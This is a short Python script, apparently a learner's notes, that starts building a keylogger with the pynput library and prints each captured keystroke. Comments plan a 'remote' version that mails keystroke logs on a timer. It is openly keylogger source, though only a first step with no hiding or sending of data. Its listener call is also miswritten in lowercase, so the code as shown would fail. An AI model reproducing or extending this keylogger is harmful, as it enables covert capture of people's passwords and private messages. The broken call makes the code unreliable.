#!/usr/bin/env python
# two type of keylogger local(stored log in local sys),remote(report by sending mail based on time interval).
# we will study threading,oop,recursive fun
# pip install pynput(in linux may be same for window) it allow us to control mouse and keybord but for this we only use for keyboard
import pynput.keyboard
def process_key_press(key):
    print(key)
keyboard_listener=pynput.keyboard.listener(on_press=process_key_press)#on_press is callback funclaaed when key is pressed
with keyboard_listener:
    keyboard_listener.join()
# basically with keyword in py is to interact with unmanaged stream of data sa above